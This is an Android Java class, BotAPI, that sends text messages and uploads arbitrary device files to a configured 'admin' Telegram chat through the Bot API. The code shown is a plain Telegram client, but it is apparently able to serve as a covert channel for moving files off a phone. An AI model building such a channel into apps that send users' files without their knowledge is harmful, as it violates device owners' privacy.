package com.black.phone;

import android.content.Context;
import android.util.Log;
import okhttp3.*;
import org.json.JSONObject;
import java.io.File;
import java.io.IOException;
import java.util.concurrent.TimeUnit;

public class BotAPI {
    private static final String TAG = "BotAPI";
    private final String token;
    private final String chatId;
    private final OkHttpClient client;

    public BotAPI(Context context) {
        Config cfg = Config.get(context);
        this.token = cfg.getBotToken();
        this.chatId = cfg.getAdminChatId();
        this.client = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .writeTimeout(60, TimeUnit.SECONDS)
                .readTimeout(60, TimeUnit.SECONDS)
                .build();
    }

    public void sendMessage(String text) {
        if (token.isEmpty() || chatId.isEmpty()) return;
        try {
            JSONObject json = new JSONObject();
            json.put("chat_id", chatId);
            json.put("text", text);
            RequestBody body = RequestBody.create(
                    json.toString(),
                    MediaType.parse("application/json; charset=utf-8")
            );
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + token + "/sendMessage")
                    .post(body)
                    .build();
            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) { Log.e(TAG, "sendMessage fail", e); }
                @Override public void onResponse(Call call, Response response) throws IOException { response.close(); }
            });
        } catch (Exception e) { Log.e(TAG, "sendMessage error", e); }
    }

    public void sendFile(File file, String caption) {
        if (token.isEmpty() || chatId.isEmpty() || file == null || !file.exists()) return;
        try {
            MultipartBody.Builder builder = new MultipartBody.Builder().setType(MultipartBody.FORM);
            builder.addFormDataPart("chat_id", chatId);
            builder.addFormDataPart("document", file.getName(),
                    RequestBody.create(file, MediaType.parse("application/octet-stream")));
            if (caption != null && !caption.isEmpty()) {
                builder.addFormDataPart("caption", caption);
            }
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + token + "/sendDocument")
                    .post(builder.build())
                    .build();
            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) { Log.e(TAG, "sendFile fail", e); }
                @Override public void onResponse(Call call, Response response) throws IOException { response.close(); }
            });
        } catch (Exception e) { Log.e(TAG, "sendFile error", e); }
    }
}
